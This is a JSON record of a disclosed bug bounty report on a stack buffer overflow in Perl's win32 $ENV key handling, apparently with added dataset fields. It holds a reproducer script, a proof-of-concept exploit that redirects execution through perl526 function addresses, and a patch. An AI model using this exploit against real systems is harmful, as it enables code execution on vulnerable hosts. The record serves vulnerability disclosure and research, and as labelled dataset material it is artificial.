{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "johnleitch ",
  "title": "Perl $ENV Key Stack Buffer Overflow",
  "content": "\nThe CPerlHost::Add method in win32\\perlhost.h is vulnerable to a stack buffer overflow.\nvoid\nCPerlHost::Add(LPCSTR lpStr)\n{\nchar szBuffer[1024];\nLPSTR *lpPtr;\nint index, length = strlen(lpStr)+1;\nfor(index = 0; lpStr[index] != '\\0' && lpStr[index] != '='; ++index)\nszBuffer[index] = lpStr[index];\nszBuffer[index] = '\\0';\n[...]\n}\nThe issue exists because the size of lpStr, the key passed in when indexing into $ENV, is not checked before it is copied into szBuffer, a fixed size stack buffer.\nThe issue can be reproduced on a win32 build with the following script.\nprint \"Starting\\r\\n\";\n$ENV{\"A\" x (0x1000)} = 0;\nprint \"Done\\r\\n\";\nIn cases where the $ENV key is exposed as attack surface (such as through CGI-BIN custom HTTP headers), it may be possible for an attacker to achieve arbitrary code execution. The issue was exploited in both Strawberry and Active State Perl, which appear to be compiled without stack canaries or ASLR.\nprint \"Starting\\r\\n\";\n$chars =\n\"\\x41\\x41\\x41\\x41\" .\n\"\\x78\\x6e\\x3b\\x6e\" . # perl526!exit (6E3B6E78)\n\"\\x43\\x43\\x43\\x43\" .\n\"\\x4e\\x1d\\x1e\\x03\" . # exit code (52305230)\n\"\\x45\\x45\\x45\\x45\" .\n\"\\x46\\x46\\x46\\x46\" .\n\"\\x47\\x47\\x47\\x47\" .\n\"\\x30\\x2c\\x3a\\x6e\"; # perl526!win32_getpid (6e3a2c30)\n$ENV{$chars x ((0x400+0x4*0x10) / length $chars)} = 0;\nprint \"Done\\r\\n\";\nA proposed patch that validates the length of lpStr follows.\ndiff --git \"a/d:\\source2\\perl-raw\\win32\\perlhost.h\" \"b/D:\\source2\\perl\\win32\\perlhost.h\"\nindex 84b08c9..665504e 100644\n--- \"a/d:\\source2\\perl-raw\\win32\\perlhost.h\"\n+++ \"b/D:\\source2\\perl\\win32\\perlhost.h\"\n@@ -2177,12 +2177,15 @@ compare(const void arg1, const void arg2)\nvoid\nCPerlHost::Add(LPCSTR lpStr)\n{\nchar szBuffer[1024];\nchar szBuffer[2048];\nLPSTR *lpPtr;\nint index, length = strlen(lpStr)+1;\nfor(index = 0; lpStr[index] != '\\0' && lpStr[index] != '='; ++index)\nszBuffer[index] = lpStr[index];\nif (index != sizeof(szBuffer) - 1)\nszBuffer[index] = lpStr[index];\nelse\nPerl_croak_nocontext(\"$ENV key too large\");\nszBuffer[index] = '\\0';\nNote that the buffer size had to be increased to accommodate larger values that were previously causing silent overwrites.\nCredit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com)\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 1500,
  "weaknesses": [
    "Stack Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1573569540,
  "report_url": "https://hackerone.com/reports/272497",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Run the following Perl script to trigger the buffer overflow: print \"Starting\\r\\n\"; $ENV{\"A\" x (0x1000)} = 0; print \"Done\\r\\n\";"
    ],
    [
      2,
      "Alternatively, use the provided exploit script with specific memory addresses to achieve arbitrary code execution: print \"Starting\\r\\n\"; $chars = \"\\x41\\x41\\x41\\x41\" . \"\\x78\\x6e\\x3b\\x6e\" . \"\\x43\\x43\\x43\\x43\" . \"\\x4e\\x1d\\x1e\\x03\" . \"\\x45\\x45\\x45\\x45\" . \"\\x46\\x46\\x46\\x46\" . \"\\x47\\x47\\x47\\x47\" . \"\\x30\\x2c\\x3a\\x6e\"; $ENV{$chars x ((0x400+0x4*0x10) / length $chars)} = 0; print \"Done\\r\\n\";"
    ]
  ],
  "vuln_description": "The vulnerability is a stack buffer overflow in the CPerlHost::Add method in win32\\perlhost.h, where the size of the key passed into $ENV is not checked before copying into a fixed-size stack buffer. This can lead to arbitrary code execution when the $ENV key is exposed as an attack surface, such as through CGI-BIN custom HTTP headers.",
  "reason": "The vulnerability involves a straightforward buffer overflow due to lack of bounds checking, a common issue in C/C++ code. The exploit requires understanding of stack buffer overflows and memory manipulation, but does not involve complex interactions or novel logic. The attack surface is clear and the steps to reproduce are direct.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}